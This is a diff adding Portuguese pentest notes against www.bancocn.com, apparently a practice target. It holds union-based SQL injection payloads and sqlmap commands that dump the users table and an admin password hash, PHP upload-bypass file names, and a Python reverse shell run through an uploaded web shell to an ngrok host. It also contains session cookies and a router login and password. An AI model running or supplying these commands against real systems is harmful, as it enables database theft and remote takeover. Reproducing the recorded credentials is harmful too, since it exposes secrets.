@@ -1,0 +1,192 @@
+======================> FERREAMENTAS
+
+whois
+host
+wafwoof
+netcat / nc -> faz conecxões de rede em (determinado ip e determinada porta).
+nmap
+dirb
+sqlmap
+hash-identifier -> identificador de hash.
+# havij
+
+======================> COLETA DE INFORMACOES (info-bancocn.txt)
+
+www.bancocn.com
+
+Email: contato@bancocn.com
+
+Tel: +835 66 7070
+
+Name Server: MEGAN.NS.CLOUDFLARE.COM
+Name Server: NOEL.NS.CLOUDFLARE.COM
+
+www.bancocn.com 104.24.123.12
+www.bancocn.com 172.67.221.226
+www.bancocn.com 104.24.122.12
+
+pesquisa google -> site:bancocn.com
+
+www.bancocn.com/robots.txt
+-> www.bancocn.com/admin
+
+MariaDB server
+
+SQL Injection -> http://www.bancocn.com/cat.php?id=1
+
+http://www.bancocn.com/assets/ -> listagem ativa
+
+http://www.bancocn.com/admin/uploads -> listagem ativa
+
+======================> ENUMERAR SERVICOS
+
+PORT     STATE SERVICE
+80/tcp   open  http
+443/tcp  open  https
+8080/tcp open  http-proxy
+8443/tcp open  https-alt
+
+somente serviços web -> 80, 443, 8080 e 8443
+
+Apache/2.4.29 (Ubuntu) -> servidor web
+
+======================
+
+palavra-chave: "bypass"
+
+2 ^ 16 = 65.536 = total de portas que um site pode ter.
+
+é possivel ter apenas um serviço por porta.
+
+# nc www.bancocn.com 80
+
+GET / HTTP/1.0
+Host: www.bancocn.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Cookie: __cfduid=dfaa496164a1cd739ee8ceb7d4e88a51c1596668959; cf_clearance=2b8266ef08a198c84bbc3fbdc17dcd197d3071da-1596669042-0-1z10270d66z93705d82zb8ecb364-150; PHPSESSID=vuk0qcbdi0seuvjcbv3lio7l57
+
+(ENTER 2X)
+
+======================
+
+"attack union based"
+
+-1 union select 1,2, database()
+
+order by -> possui 3 colunas
+
+union all select
+
+schema_name from information_schema.schemata -> bancocn
+
+    ^-> primeiro banco de dados da lista de bancos.
+
+
+
+-1 union select 1,2, group_concat(schema_name) from information_schema.schemata -> bancocn,information_schema
+
+    ^-> todos os bancos (somente será visível os que não precisam de permissão).
+
+
+
+table_name from information_schema.tables where table_schema="nome_do_banco"
+
+-1 union select 1,2, group_concat(table_name) from information_schema.tables where table_schema="bancocn" -> categories,pictures,stats,users
+
+    ^-> tabelas dentro do banco de dados.
+
+
+
+column_name from information_schema.columns where table_schema=
+
+-1 union select 1,2, group_concat(column_name) from information_schema.columns where table_schema="bancocn" and table_name="users" -> id,login,password
+
+
+select campos from nomedobanco.nomedatabela
+
+
+-1 union select 1,2, login from bancocn.users -> admin
+
+-1 union select 1,2, group_concat(id, ":", login, ":", password) from bancocn.users -> 1:admin:7b71be0e85318117d2e514ce2a2e222c
+
+https://hashes.com/en/decrypt/hash
+
+======================
+
+sqlmap attack
+
+# sqlmap -U http://www.bancocn.com/cat.php?id=3 --dbs --dbms=mysql
+
+   ^-> erro -> cloudfire.
+
+
+
+# sqlmap -r header.txt --dbs --dbms=mysql
+
+   ^-> listar nome dos bancos de dados, após ter feito o arquivo de texto com o header (request header) do site.
+
+
+
+# sqlmap -r header.txt --dbms=mysql -D bancocn --tables
+
+  ^-> listar nome das tabelas de um banco específico.
+
+
+
+# sqlmap -r header.txt --dbms=mysql -D bancocn -T users --columns
+
+  ^-> listar colunas.
+
+
+# sqlmap -r header.txt --dbms=mysql -D bancocn -T users -C login,password --dump
+
+  ^-> listar login e senha.
+
+======================
+
++-------+----------------------------------+
+| login | password                         |
++-------+----------------------------------+
+| admin | 7b71be0e85318117d2e514ce2a2e222c |
++-------+----------------------------------+
+
+======================
+
+Carregar o arquivo phpinfo.php no servidor:
+
+-> phpinfo.php
+
+-> phpinfo.jpg
+
+-> phpinfo.jpg.php
+
+-> phpinfo.php5
+
+======================
+
+login / senha roteador -> NET_C6753A A89FECC6753A
+
+meu ip ->
+
+roteador ip ->
+
+meu ip externo ->
+
+ip real do servidor -> 34.207.16.7
+
+possível novo ip real do servidor -> 172.22.0.2
+
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+    ^-> www.bancocn.com/admin/uploads/cmd.php5?cmd= python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+
+
+python -c "import pty; pty.spawn('/bin/bash')"
+
+======================
+
+chmod +x nome_arquivo.extensão -> consede permissão de execução ao arquivo.
